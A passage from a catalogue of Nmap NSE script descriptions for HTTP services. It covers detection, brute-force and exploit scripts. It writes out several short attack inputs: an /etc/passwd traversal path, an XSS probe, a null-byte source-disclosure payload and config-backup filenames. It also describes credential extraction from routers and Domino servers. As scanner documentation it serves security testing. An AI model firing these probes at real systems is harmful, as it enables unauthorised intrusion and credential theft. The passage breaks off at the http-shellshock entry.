  backup or swap files in a place where the web server can serve them. The
  script checks for these files:

  * <code>wp-config.php</code>: WordPress
  * <code>config.php</code>: phpBB, ExpressionEngine
  * <code>configuration.php</code>: Joomla
  * <code>LocalSettings.php</code>: MediaWiki
  * <code>/mediawiki/LocalSettings.php</code>: MediaWiki
  * <code>mt-config.cgi</code>: Movable Type
  * <code>mt-static/mt-config.cgi</code>: Movable Type
  * <code>settings.php</code>: Drupal
  * <code>.htaccess</code>: Apache

  And for each of these file applies the following transformations (using
  <code>config.php</code> as an example):

  * <code>config.bak</code>: Generic backup.
  * <code>config.php.bak</code>: Generic backup.
  * <code>config.php~</code>: Vim, Gedit.
  * <code>#config.php#</code>: Emacs.
  * <code>config copy.php</code>: Mac OS copy.
  * <code>Copy of config.php</code>: Windows copy.
  * <code>config.php.save</code>: GNU Nano.
  * <code>.config.php.swp</code>: Vim swap.
  * <code>config.php.swp</code>: Vim swap.
  * <code>config.php.old</code>: Generic backup.

  This script is inspired by the CMSploit program by Feross Aboukhadijeh:
  http://www.feross.org/cmsploit/.

http-cookie-flags
Categories: default safe vuln
https://nmap.org/nsedoc/scripts/http-cookie-flags.html
  Examines cookies set by HTTP services.  Reports any session cookies set
  without the httponly flag.  Reports any session cookies set over SSL without
  the secure flag.  If http-enum.nse is also run, any interesting paths found
  by it will be checked in addition to the root.

http-cors
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/http-cors.html
  Tests an http server for Cross-Origin Resource Sharing (CORS), a way
  for domains to explicitly opt in to having certain methods invoked by
  another domain.

  The script works by setting the Access-Control-Request-Method header
  field for certain enumerated methods in OPTIONS requests, and checking
  the responses.

http-cross-domain-policy
Categories: safe external vuln
https://nmap.org/nsedoc/scripts/http-cross-domain-policy.html
  Checks the cross-domain policy file (/crossdomain.xml) and the client-acces-policy file (/clientaccesspolicy.xml)
  in web applications and lists the trusted domains. Overly permissive settings enable Cross Site Request Forgery
  attacks and may allow attackers to access sensitive data. This script is useful to detect permissive
  configurations and possible domain names available for purchase to exploit the application.

  The script queries instantdomainsearch.com to lookup the domains. This functionality is
  turned off by default, to enable it set the script argument http-cross-domain-policy.domain-lookup.

  References:
  * http://sethsec.blogspot.com/2014/03/exploiting-misconfigured-crossdomainxml.html
  * http://gursevkalra.blogspot.com/2013/08/bypassing-same-origin-policy-with-flash.html
  * https://www.adobe.com/devnet/articles/crossdomain_policy_file_spec.html
  * https://www.adobe.com/devnet-docs/acrobatetk/tools/AppSec/CrossDomain_PolicyFile_Specification.pdf
  * https://www.owasp.org/index.php/Test_RIA_cross_domain_policy_%28OTG-CONFIG-008%29
  * http://acunetix.com/vulnerabilities/web/insecure-clientaccesspolicy-xml-file

http-csrf
Categories: intrusive exploit vuln
https://nmap.org/nsedoc/scripts/http-csrf.html
  This script detects Cross Site Request Forgeries (CSRF) vulnerabilities.

  It will try to detect them by checking each form if it contains an unpredictable
  token for each user. Without one an attacker may forge malicious requests.

  To recognize a token in a form, the script will iterate through the form's
  attributes and will search for common patterns in their names. If that fails, it
  will also calculate the entropy of each attribute's value. A big entropy means a
  possible token.

  A common use case for this script comes along with a cookie that gives access
  in pages that require authentication, because that's where the privileged
  exist. See the http library's documentation to set your own cookie.

http-date
Categories: discovery safe
https://nmap.org/nsedoc/scripts/http-date.html
  Gets the date from HTTP-like services. Also prints how much the date
  differs from local time. Local time is the time the HTTP request was
  sent, so the difference includes at least the duration of one RTT.

http-default-accounts
Categories: discovery auth intrusive
https://nmap.org/nsedoc/scripts/http-default-accounts.html
  Tests for access with default credentials used by a variety of web applications and devices.

  It works similar to http-enum, we detect applications by matching known paths and launching a login routine using default credentials when found.
  This script depends on a fingerprint file containing the target's information: name, category, location paths, default credentials and login routine.

  You may select a category if you wish to reduce the number of requests. We have categories like:
  * <code>web</code> - Web applications
  * <code>routers</code> - Routers
  * <code>security</code> - CCTVs and other security devices
  * <code>industrial</code> - Industrial systems
  * <code>printer</code> - Network-attached printers and printer servers
  * <code>storage</code> - Storage devices
  * <code>virtualization</code> - Virtualization systems
  * <code>console</code> - Remote consoles

  You can also select a specific fingerprint or a brand, such as BIG-IQ or Siemens. This matching is based on case-insensitive words. This means that "nas" will select Seagate BlackArmor NAS storage but not Netgear ReadyNAS.

  For a fingerprint to be used it needs to satisfy both the category and name criteria.

  By default, the script produces output only when default credentials are found, while staying silent when the target only matches some fingerprints (but no credentials are found). With increased verbosity (option -v), the script will also report all matching fingerprints.

  Please help improve this script by adding new entries to nselib/data/http-default-accounts.lua

  Remember each fingerprint must have:
  * <code>name</code> - Descriptive name
  * <code>category</code> - Category
  * <code>login_combos</code> - Table of login combinations
  * <code>paths</code> - Table containing possible path locations of the target
  * <code>login_check</code> - Login function of the target

  In addition, a fingerprint should have:
  * <code>target_check</code> - Target validation function. If defined, it will be called to validate the target before attempting any logins.
  * <code>cpe</code> - Official CPE Dictionary entry (see https://nvd.nist.gov/cpe.cfm)

  Default fingerprint file: /nselib/data/http-default-accounts-fingerprints.lua
  This script was based on http-enum.

http-devframework
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/http-devframework.html

  Tries to find out the technology behind the target website.

  The script checks for certain defaults that might not have been changed, like
  common headers or URLs or HTML content.

  While the script does some guessing, note that overall there's no way to
  determine what technologies a given site is using.

  You can help improve this script by adding new entries to
  nselib/data/http-devframework-fingerprints.lua

  Each entry must have:
  * <code>rapidDetect</code> - Callback function that is called in the beginning
  of detection process. It takes the host and port of target website as arguments.
  * <code>consumingDetect</code> - Callback function that is called for each
  spidered page. It takes the body of the response (HTML code) and the requested
  path as arguments.

  Note that the <code>consumingDetect</code> callback will not take place only if
  <code>rapid</code> option is enabled.


http-dlink-backdoor
Categories: exploit vuln
https://nmap.org/nsedoc/scripts/http-dlink-backdoor.html
  Detects a firmware backdoor on some D-Link routers by changing the User-Agent
  to a "secret" value. Using the "secret" User-Agent bypasses authentication
  and allows admin access to the router.

  The following router models are likely to be vulnerable: DIR-100, DIR-120,
  DI-624S, DI-524UP, DI-604S, DI-604UP, DI-604+, TM-G5240

  In addition, several Planex routers also appear to use the same firmware:
  BRL-04UR, BRL-04CW

  Reference: http://www.devttys0.com/2013/10/reverse-engineering-a-d-link-backdoor/

http-dombased-xss
Categories: intrusive exploit vuln
https://nmap.org/nsedoc/scripts/http-dombased-xss.html
  It looks for places where attacker-controlled information in the DOM may be used
  to affect JavaScript execution in certain ways. The attack is explained here:
  http://www.webappsec.org/projects/articles/071105.shtml

http-domino-enum-passwords
Categories: intrusive auth
https://nmap.org/nsedoc/scripts/http-domino-enum-passwords.html
  Attempts to enumerate the hashed Domino Internet Passwords that are (by
  default) accessible by all authenticated users. This script can also download
  any Domino ID Files attached to the Person document.  Passwords are presented
  in a form suitable for running in John the Ripper.

  The passwords may be stored in two forms (http://comments.gmane.org/gmane.comp.security.openwall.john.user/785):

  1. Saltless (legacy support?)
     Example: 355E98E7C7B59BD810ED845AD0FD2FC4
     John's format name: lotus5
  2. Salted (also known as "More Secure Internet Password")
     Example: (GKjXibCW2Ml6juyQHUoP)
     John's format name: dominosec

  It appears as if form based authentication is enabled, basic authentication
  still works. Therefore the script should work in both scenarios. Valid
  credentials can either be supplied directly using the parameters username
  and password or indirectly from results of http-brute or http-form-brute.

http-drupal-enum-users
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/http-drupal-enum-users.html
  Enumerates Drupal users by exploiting an information disclosure vulnerability
  in Views, Drupal's most popular module.

  Requests to admin/views/ajax/autocomplete/user/STRING return all usernames that
  begin with STRING. The script works by iterating STRING over letters to extract
  all usernames.

  For more information,see:
  * http://www.madirish.net/node/465

http-drupal-enum
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/http-drupal-enum.html
  Enumerates the installed Drupal modules/themes by using a list of known modules and themes.

  The script works by iterating over module/theme names and requesting
  MODULE_PATH/MODULE_NAME/LICENSE.txt for modules and THEME_PATH/THEME_NAME/LICENSE.txt.
  MODULE_PATH/THEME_PATH which is either provided by the user, grepped for in the html body
  or defaulting to sites/all/modules/.

  If the response status code is 200, it means that the module/theme is installed. By
  default, the script checks for the top 100 modules/themes (by downloads), given the
  huge number of existing modules (~18k) and themes(~1.4k).

  If you want to update your themes or module list refer to the link below.

  * https://svn.nmap.org/nmap-exp/gyani/misc/drupal-update.py

http-enum
Categories: discovery intrusive vuln
https://nmap.org/nsedoc/scripts/http-enum.html
  Enumerates directories used by popular web applications and servers.

  This parses a fingerprint file that's similar in format to the Nikto Web application
  scanner. This script, however, takes it one step further by building in advanced pattern matching as well
  as having the ability to identify specific versions of Web applications.

  You can also parse a Nikto-formatted database using http-fingerprints.nikto-db-path. This will try to parse
  most of the fingerprints defined in nikto's database in real time. More documentation about this in the
  nselib/data/http-fingerprints.lua file.

  Currently, the database can be found under Nmap's directory in the nselib/data folder. The file is called
  http-fingerprints and has a long description of its functionality in the file header.

  Many of the finger prints were discovered by me (Ron Bowes), and a number of them are from the Yokoso
  project, used with permission from Kevin Johnson (http://seclists.org/nmap-dev/2009/q3/0685.html).

  Initially, this script attempts to access two different random files in order to detect servers
  that don't return a proper 404 Not Found status. In the event that they return 200 OK, the body
  has any non-static-looking data removed (URI, time, etc), and saved. If the two random attempts
  return different results, the script aborts (since a 200-looking 404 cannot be distinguished from
  an actual 200). This will prevent most false positives.

  In addition, if the root folder returns a 301 Moved Permanently or 401 Authentication Required,
  this script will also abort. If the root folder has disappeared or requires authentication, there
  is little hope of finding anything inside it.

  By default, only pages that return 200 OK or 401 Authentication Required are displayed. If the
  <code>http-enum.displayall</code> script argument is set, however, then all results will be displayed (except
  for 404 Not Found and the status code returned by the random files). Entries in the http-fingerprints
  database can specify their own criteria for accepting a page as valid.


http-errors
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/http-errors.html
  This script crawls through the website and returns any error pages.

  The script will return all pages (sorted by error code) that respond with an
  http code equal or above 400. To change this behaviour, please use the
  <code>errcodes</code> option.

  The script, by default, spiders and searches within forty pages. For large web
  applications make sure to increase httpspider's <code>maxpagecount</code> value.
  Please, note that the script will become more intrusive though.

http-exif-spider
Categories: intrusive
https://nmap.org/nsedoc/scripts/http-exif-spider.html
  Spiders a site's images looking for interesting exif data embedded in
  .jpg files. Displays the make and model of the camera, the date the photo was
  taken, and the embedded geotag information.

http-favicon
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/http-favicon.html
  Gets the favicon ("favorites icon") from a web page and matches it against a
  database of the icons of known web applications. If there is a match, the name
  of the application is printed; otherwise the MD5 hash of the icon data is
  printed.

  If the script argument <code>favicon.uri</code> is given, that relative URI is
  always used to find the favicon. Otherwise, first the page at the root of the
  web server is retrieved and parsed for a <code><link rel="icon"></code>
  element. If that fails, the icon is looked for in <code>/favicon.ico</code>. If
  a <code><link></code> favicon points to a different host or port, it is ignored.

http-feed
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/http-feed.html
  This script crawls through the website to find any rss or atom feeds.

  The script, by default, spiders and searches within forty pages. For large web
  applications make sure to increase httpspider's <code>maxpagecount</code> value.
  Please, note that the script will become more intrusive though.

http-fetch
Categories: safe
https://nmap.org/nsedoc/scripts/http-fetch.html
  The script is used to fetch files from servers.

  The script supports three different use cases:
  * The paths argument isn't provided, the script spiders the host
    and downloads files in their respective folders relative to
    the one provided using "destination".
  * The paths argument(a single item or list) is provided and the path starts
    with "/", the script tries to fetch the path relative to the url
    provided via the argument "url".
  * The paths argument(a single item or list) is provided and the path doesn't
    start with "/". Then the script spiders the host and tries to find
    files which contain the path(now treated as a pattern).

http-fileupload-exploiter
Categories: intrusive exploit vuln
https://nmap.org/nsedoc/scripts/http-fileupload-exploiter.html
  Exploits insecure file upload forms in web applications
  using various techniques like changing the Content-type
  header or creating valid image files containing the
  payload in the comment.

http-form-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/http-form-brute.html
  Performs brute force password auditing against http form-based authentication.

  This script uses the unpwdb and brute libraries to perform password
  guessing. Any successful guesses are stored in the nmap registry, using
  the creds library, for other scripts to use.

  The script automatically attempts to discover the form method, action, and
  field names to use in order to perform password guessing. (Use argument
  path to specify the page where the form resides.) If it fails doing so
  the form components can be supplied using arguments method, path, uservar,
  and passvar. The same arguments can be used to selectively override
  the detection outcome.

  The script contains a small database of known web apps' form information. This
  improves form detection and also allows for form mangling and custom success
  detection functions. If the script arguments aren't expressive enough, users
  are encouraged to edit the database to fit.

  After attempting to authenticate using a HTTP GET or POST request the script
  analyzes the response and attempts to determine whether authentication was
  successful or not. The script analyzes this by checking the response using
  the following rules:

  1. If the response was empty the authentication was successful.
  2. If the onsuccess argument was provided then the authentication either
     succeeded or failed depending on whether the response body contained
     the message/pattern passed in the onsuccess argument.
  3. If no onsuccess argument was passed, and if the onfailure argument
     was provided then the authentication either succeeded or failed
     depending on whether the response body does not contain
     the message/pattern passed in the onfailure argument.
  4. If neither the onsuccess nor onfailure argument was passed and the
     response contains a form field named the same as the submitted
     password parameter then the authentication failed.
  5. Authentication was successful.

http-form-fuzzer
Categories: fuzzer intrusive
https://nmap.org/nsedoc/scripts/http-form-fuzzer.html
  Performs a simple form fuzzing against forms found on websites.
  Tries strings and numbers of increasing length and attempts to
  determine if the fuzzing was successful.

http-frontpage-login
Categories: vuln safe
https://nmap.org/nsedoc/scripts/http-frontpage-login.html
  Checks whether target machines are vulnerable to anonymous Frontpage login.

  Older, default configurations of Frontpage extensions allow
  remote user to login anonymously which may lead to server compromise.


http-generator
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/http-generator.html
  Displays the contents of the "generator" meta tag of a web page (default: /)
  if there is one.

http-git
Categories: default safe vuln
https://nmap.org/nsedoc/scripts/http-git.html
  Checks for a Git repository found in a website's document root
  /.git/<something>) and retrieves as much repo information as
  possible, including language/framework, remotes, last commit
  message, and repository description.

http-gitweb-projects-enum
Categories: discovery safe
https://nmap.org/nsedoc/scripts/http-gitweb-projects-enum.html
  Retrieves a list of Git projects, owners and descriptions from a gitweb (web interface to the Git revision control system).

http-google-malware
Categories: malware discovery safe external
https://nmap.org/nsedoc/scripts/http-google-malware.html
  Checks if hosts are on Google's blacklist of suspected malware and phishing
  servers. These lists are constantly updated and are part of Google's Safe
  Browsing service.

  To do this the script queries the Google's Safe Browsing service and you need
  to have your own API key to access Google's Safe Browsing Lookup services. Sign
  up for yours at http://code.google.com/apis/safebrowsing/key_signup.html

  * To learn more about Google's Safe Browsing:
  http://code.google.com/apis/safebrowsing/

  * To register and get your personal API key:
  http://code.google.com/apis/safebrowsing/key_signup.html

http-grep
Categories: discovery safe
https://nmap.org/nsedoc/scripts/http-grep.html
  Spiders a website and attempts to match all pages and urls against a given
  string. Matches are counted and grouped per url under which they were
  discovered.

  Features built in patterns like email, ip, ssn, discover, amex and more.
  The script searches for email and ip by default.


http-headers
Categories: discovery safe
https://nmap.org/nsedoc/scripts/http-headers.html
  Performs a HEAD request for the root folder ("/") of a web server and displays the HTTP headers returned.

http-hp-ilo-info
Categories: safe discovery
https://nmap.org/nsedoc/scripts/http-hp-ilo-info.html
  Attempts to extract information from HP iLO boards including versions and addresses.

  HP iLO boards have an unauthenticated info disclosure at <ip>/xmldata?item=all.
  It lists board informations such as server model, firmware version,
  MAC addresses, IP addresses, etc. This script uses the slaxml library
  to parse the iLO xml file and display the info.

http-huawei-hg5xx-vuln
Categories: exploit vuln
https://nmap.org/nsedoc/scripts/http-huawei-hg5xx-vuln.html
  Detects Huawei modems models HG530x, HG520x, HG510x (and possibly others...)
  vulnerable to a remote credential and information disclosure vulnerability. It
  also extracts the PPPoE credentials and other interesting configuration values.

  Attackers can query the URIs "/Listadeparametros.html" and "/wanfun.js" to
  extract sensitive information including PPPoE credentials, firmware version,
  model, gateway, dns servers and active connections among other values.

  This script exploits two vulnerabilities. One was discovered and reported by
  Adiaz from Comunidad Underground de Mexico (http://underground.org.mx) and it
  allows attackers to extract the pppoe password. The configuration disclosure
  vulnerability was discovered by Pedro Joaquin (http://hakim.ws).

  References:
  * http://websec.ca/advisories/view/Huawei-HG520c-3.10.18.x-information-disclosure
  * http://routerpwn.com/#huawei

http-icloud-findmyiphone
Categories: discovery safe external
https://nmap.org/nsedoc/scripts/http-icloud-findmyiphone.html
  Retrieves the locations of all "Find my iPhone" enabled iOS devices by querying
  the MobileMe web service (authentication required).

http-icloud-sendmsg
Categories: discovery safe external
https://nmap.org/nsedoc/scripts/http-icloud-sendmsg.html
  Sends a message to a iOS device through the Apple MobileMe web service. The
  device has to be registered with an Apple ID using the Find My Iphone
  application.

http-iis-short-name-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/http-iis-short-name-brute.html
  Attempts to brute force the 8.3 filenames (commonly known as short names) of files and directories in the root folder
  of vulnerable IIS servers. This script is an implementation of the PoC "iis shortname scanner".

  The script uses ~,? and * to bruteforce the short name of files present in the IIS document root.
  Short names have a restriction of 6 character file name followed by a three character extension.

  Notes:
  * The script might have to be run twice (according to the original author).
  * Tested against IIS 6.0 and 5.1.

  References:
  * Research paper: http://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf
  * IIS Shortname Scanner PoC: https://github.com/irsdl/IIS-ShortName-Scanner

http-iis-webdav-vuln
Categories: vuln intrusive
https://nmap.org/nsedoc/scripts/http-iis-webdav-vuln.html
  Checks for a vulnerability in IIS 5.1/6.0 that allows arbitrary users to access
  secured WebDAV folders by searching for a password-protected folder and
  attempting to access it. This vulnerability was patched in Microsoft Security
  Bulletin MS09-020, https://nmap.org/r/ms09-020.

  A list of well known folders (almost 900) is used by default. Each one is
  checked, and if returns an authentication request (401), another attempt is
  tried with the malicious encoding. If that attempt returns a successful result
  (207), then the folder is marked as vulnerable.

  This script is based on the Metasploit auxiliary module
  auxiliary/scanner/http/wmap_dir_webdav_unicode_bypass

  For more information on this vulnerability and script, see:
  * http://blog.zoller.lu/2009/05/iis-6-webdac-auth-bypass-and-data.html
  * http://seclists.org/fulldisclosure/2009/May/att-134/IIS_Advisory_pdf.bin
  * http://www.skullsecurity.org/blog/?p=271
  * http://www.kb.cert.org/vuls/id/787932
  * http://www.microsoft.com/technet/security/advisory/971492.mspx

http-internal-ip-disclosure
Categories: vuln discovery safe
https://nmap.org/nsedoc/scripts/http-internal-ip-disclosure.html
  Determines if the web server leaks its internal IP address when sending an HTTP/1.0 request without a Host header.

  Some misconfigured web servers leak their internal IP address in the response
  headers when returning a redirect response. This is a known issue for some
  versions of Microsoft IIS, but affects other web servers as well.

http-joomla-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/http-joomla-brute.html
  Performs brute force password auditing against Joomla web CMS installations.

  This script initially reads the session cookie and parses the security token to perfom the brute force password auditing.
  It uses the unpwdb and brute libraries to perform password guessing. Any successful guesses are stored using the
  credentials library.

  Joomla's default uri and form names:
  * Default uri:<code>/administrator/index.php</code>
  * Default uservar: <code>username</code>
  * Default passvar: <code>passwd</code>

http-jsonp-detection
Categories: safe vuln discovery
https://nmap.org/nsedoc/scripts/http-jsonp-detection.html
  Attempts to discover JSONP endpoints in web servers. JSONP endpoints can be
  used to bypass Same-origin Policy restrictions in web browsers.

  The script searches for callback functions in the response to detect JSONP
  endpoints. It also tries to determine callback function through URL(callback
  function may be fully or partially controllable from URL) and also tries to
  bruteforce the most common callback variables through the URL.

  References : https://securitycafe.ro/2017/01/18/practical-jsonp-injection/


http-litespeed-sourcecode-download
Categories: vuln intrusive exploit
https://nmap.org/nsedoc/scripts/http-litespeed-sourcecode-download.html
  Exploits a null-byte poisoning vulnerability in Litespeed Web Servers 4.0.x
  before 4.0.15 to retrieve the target script's source code by sending a HTTP
  request with a null byte followed by a .txt file extension (CVE-2010-2333).

  If the server is not vulnerable it returns an error 400. If index.php is not
  found, you may try /phpinfo.php which is also shipped with LiteSpeed Web
  Server. The attack payload looks like this:
  * <code>/index.php\00.txt</code>

  References:
  * http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2333
  * http://www.exploit-db.com/exploits/13850/

http-ls
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/http-ls.html
  Shows the content of an "index" Web page.

  TODO:
    - add support for more page formats

http-majordomo2-dir-traversal
Categories: intrusive vuln exploit
https://nmap.org/nsedoc/scripts/http-majordomo2-dir-traversal.html
  Exploits a directory traversal vulnerability existing in Majordomo2 to retrieve remote files. (CVE-2011-0049).

  Vulnerability originally discovered by Michael Brooks.

  For more information about this vulnerability:
  * http://www.mj2.org/
  * http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0049
  * http://www.exploit-db.com/exploits/16103/

http-malware-host
Categories: malware safe
https://nmap.org/nsedoc/scripts/http-malware-host.html
  Looks for signature of known server compromises.

  Currently, the only signature it looks for is the one discussed here:
  http://blog.unmaskparasites.com/2009/09/11/dynamic-dns-and-botnet-of-zombie-web-servers/.
  This is done by requesting the page <code>/ts/in.cgi?open2</code> and
  looking for an errant 302 (it attempts to detect servers that always
  return 302). Thanks to Denis from the above link for finding this
  technique!

http-mcmp
Categories: safe discovery
https://nmap.org/nsedoc/scripts/http-mcmp.html
  Checks if the webserver allows mod_cluster management protocol (MCMP) methods.

  The script sends a MCMP PING message to determine protocol support, then issues
  the DUMP command to dump the current configuration seen by mod_cluster_manager.

  References:

  * https://developer.jboss.org/wiki/Mod-ClusterManagementProtocol

http-method-tamper
Categories: auth vuln
https://nmap.org/nsedoc/scripts/http-method-tamper.html
  Attempts to bypass password protected resources (HTTP 401 status) by performing HTTP verb tampering.
  If an array of paths to check is not set, it will crawl the web server and perform the check against any
  password protected resource that it finds.

  The script determines if the protected URI is vulnerable by performing HTTP verb tampering and monitoring
   the status codes. First, it uses a HEAD request, then a POST request and finally a random generated string
  ( This last one is useful when web servers treat unknown request methods as a GET request. This is the case
   for PHP servers ).

  If the table <code>paths</code> is set, it will attempt to access the given URIs. Otherwise, a web crawler
  is initiated to try to find protected resources. Note that in a PHP environment with .htaccess files you need to specify a
  path to a file rather than a directory to find misconfigured .htaccess files.

  References:
  * http://www.imperva.com/resources/glossary/http_verb_tampering.html
  * https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29
  * http://www.mkit.com.ar/labs/htexploit/
  * http://capec.mitre.org/data/definitions/274.html

http-methods
Categories: default safe
https://nmap.org/nsedoc/scripts/http-methods.html
  Finds out what options are supported by an HTTP server by sending an
  OPTIONS request. Lists potentially risky methods. It tests those methods
  not mentioned in the OPTIONS headers individually and sees if they are
  implemented. Any output other than 501/405 suggests that the method is
  if not in the range 400 to 600. If the response falls under that range then
  it is compared to the response from a randomly generated method.

  In this script, "potentially risky" methods are anything except GET,
  HEAD, POST, and OPTIONS. If the script reports potentially risky
  methods, they may not all be security risks, but you should check to
  make sure. This page lists the dangers of some common methods:

  http://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29

  The list of supported methods comes from the contents of the Allow and
  Public header fields. In verbose mode, a list of all methods is printed,
  followed by the list of potentially risky methods. Without verbose mode,
  only the potentially risky methods are shown.

http-mobileversion-checker
Categories: discovery safe
https://nmap.org/nsedoc/scripts/http-mobileversion-checker.html
  Checks if the website holds a mobile version.

http-ntlm-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/http-ntlm-info.html
  This script enumerates information from remote HTTP services with NTLM
  authentication enabled.

  By sending a HTTP NTLM authentication request with null domain and user
  credentials (passed in the 'Authorization' header), the remote service will
  respond with a NTLMSSP message (encoded within the 'WWW-Authenticate' header)
  and disclose information to include NetBIOS, DNS, and OS build version if
  available.

http-open-proxy
Categories: default discovery external safe
https://nmap.org/nsedoc/scripts/http-open-proxy.html
  Checks if an HTTP proxy is open.

  The script attempts to connect to www.google.com through the proxy and
  checks for a valid HTTP response code. Valid HTTP response codes are
  200, 301, and 302. If the target is an open proxy, this script causes
  the target to retrieve a web page from www.google.com.

http-open-redirect
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/http-open-redirect.html
  Spiders a website and attempts to identify open redirects. Open
  redirects are handlers which commonly take a URL as a parameter and
  responds with a HTTP redirect (3XX) to the target.  Risks of open redirects are
  described at http://cwe.mitre.org/data/definitions/601.html.

  Only open redirects that are directly linked on the target website can be
  discovered this way. If an open redirector is not linked, it will not be
  discovered.

http-passwd
Categories: intrusive vuln
https://nmap.org/nsedoc/scripts/http-passwd.html
  Checks if a web server is vulnerable to directory traversal by attempting to
  retrieve <code>/etc/passwd</code> or <code>\boot.ini</code>.

  The script uses several technique:
  * Generic directory traversal by requesting paths like <code>../../../../etc/passwd</code>.
  * Known specific traversals of several web servers.
  * Query string traversal. This sends traversals as query string parameters to paths that look like they refer to a local file name. The potential query is searched for in at the path controlled by the script argument <code>http-passwd.root</code>.

http-php-version
Categories: discovery safe
https://nmap.org/nsedoc/scripts/http-php-version.html
  Attempts to retrieve the PHP version from a web server. PHP has a number
  of magic queries that return images or text that can vary with the PHP
  version. This script uses the following queries:
  * <code>/?=PHPE9568F36-D428-11d2-A769-00AA001ACF42</code>: gets a GIF logo, which changes on April Fool's Day.
  * <code>/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000</code>: gets an HTML credits page.

  A list of magic queries is at http://www.0php.com/php_easter_egg.php.
  The script also checks if any header field value starts with
  <code>"PHP"</code> and reports that value if found.

  PHP versions after 5.5.0 do not respond to these queries.

  Link:
  * http://phpsadness.com/sad/11

http-phpmyadmin-dir-traversal
Categories: vuln exploit
https://nmap.org/nsedoc/scripts/http-phpmyadmin-dir-traversal.html
  Exploits a directory traversal vulnerability in phpMyAdmin 2.6.4-pl1 (and
  possibly other versions) to retrieve remote files on the web server.

  Reference:
  * http://www.exploit-db.com/exploits/1244/

http-phpself-xss
Categories: fuzzer intrusive vuln
https://nmap.org/nsedoc/scripts/http-phpself-xss.html
  Crawls a web server and attempts to find PHP files vulnerable to reflected
  cross site scripting via the variable <code>$_SERVER["PHP_SELF"]</code>.

  This script crawls the webserver to create a list of PHP files and then sends
  an attack vector/probe to identify PHP_SELF cross site scripting
  vulnerabilities.  PHP_SELF XSS refers to reflected cross site scripting
  vulnerabilities caused by the lack of sanitation of the variable
  <code>$_SERVER["PHP_SELF"]</code> in PHP scripts. This variable is commonly
  used in PHP scripts that display forms and when the script file name  is
  needed.

  Examples of Cross Site Scripting vulnerabilities in the variable $_SERVER[PHP_SELF]:
  * http://www.securityfocus.com/bid/37351
  * http://software-security.sans.org/blog/2011/05/02/spot-vuln-percentage
  * http://websec.ca/advisories/view/xss-vulnerabilities-mantisbt-1.2.x

  The attack vector/probe used is: <code>/'"/><script>alert(1)</script></code>

http-proxy-brute
Categories: brute intrusive external
https://nmap.org/nsedoc/scripts/http-proxy-brute.html
  Performs brute force password guessing against HTTP proxy servers.

http-put
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/http-put.html
  Uploads a local file to a remote web server using the HTTP PUT method. You must specify the filename and URL path with NSE arguments.

http-qnap-nas-info
Categories: safe discovery
https://nmap.org/nsedoc/scripts/http-qnap-nas-info.html
  Attempts to retrieve the model, firmware version, and enabled services from a
  QNAP Network Attached Storage (NAS) device.

http-referer-checker
Categories: discovery safe
https://nmap.org/nsedoc/scripts/http-referer-checker.html
  Informs about cross-domain include of scripts. Websites that include
  external javascript scripts are delegating part of their security to
  third-party entities.

http-rfi-spider
Categories: intrusive
https://nmap.org/nsedoc/scripts/http-rfi-spider.html
  Crawls webservers in search of RFI (remote file inclusion) vulnerabilities. It
  tests every form field it finds and every parameter of a URL containing a
  query.

http-robots.txt
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/http-robots.txt.html
  Checks for disallowed entries in <code>/robots.txt</code> on a web server.

  The higher the verbosity or debug level, the more disallowed entries are shown.

http-robtex-reverse-ip
Categories: discovery safe external
https://nmap.org/nsedoc/scripts/http-robtex-reverse-ip.html
  Obtains up to 100 forward DNS names for a target IP address by querying the Robtex service (https://www.robtex.com/ip-lookup/).

  *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/

http-robtex-shared-ns
Categories: discovery safe external
https://nmap.org/nsedoc/scripts/http-robtex-shared-ns.html
  Finds up to 100 domain names which use the same name server as the target by querying the Robtex service at http://www.robtex.com/dns/.

  The target must be specified by DNS name, not IP address.

  *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/

http-sap-netweaver-leak
Categories: safe discovery
https://nmap.org/nsedoc/scripts/http-sap-netweaver-leak.html
  Detects SAP Netweaver Portal instances that allow anonymous access to the
   KM unit navigation page. This page leaks file names, ldap users, etc.

  SAP Netweaver Portal with the Knowledge Management Unit enable allows unauthenticated
  users to list file system directories through the URL '/irj/go/km/navigation?Uri=/'.

  This issue has been reported and won't be fixed.

  References:
  * https://help.sap.com/saphelp_nw73ehp1/helpdata/en/4a/5c004250995a6ae10000000a42189b/frameset.htm

http-security-headers
Categories: discovery safe
https://nmap.org/nsedoc/scripts/http-security-headers.html
  Checks for the HTTP response headers related to security given in OWASP Secure Headers Project
  and gives a brief description of the header and its configuration value.

  The script requests the server for the header with http.head and parses it to list headers founds with their
  configurations. The script checks for HSTS(HTTP Strict Transport Security), HPKP(HTTP Public Key Pins),
  X-Frame-Options, X-XSS-Protection, X-Content-Type-Options, Content-Security-Policy,
  X-Permitted-Cross-Domain-Policies, Set-Cookie, Expect-CT, Cache-Control, Pragma and Expires.

  References: https://www.owasp.org/index.php/OWASP_Secure_Headers_Project
  https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers


http-server-header
Categories: version
https://nmap.org/nsedoc/scripts/http-server-header.html
  Uses the HTTP Server header for missing version info. This is currently
  infeasible with version probes because of the need to match non-HTTP services
  correctly.

http-shellshock
Categories: exploit vuln intrusive
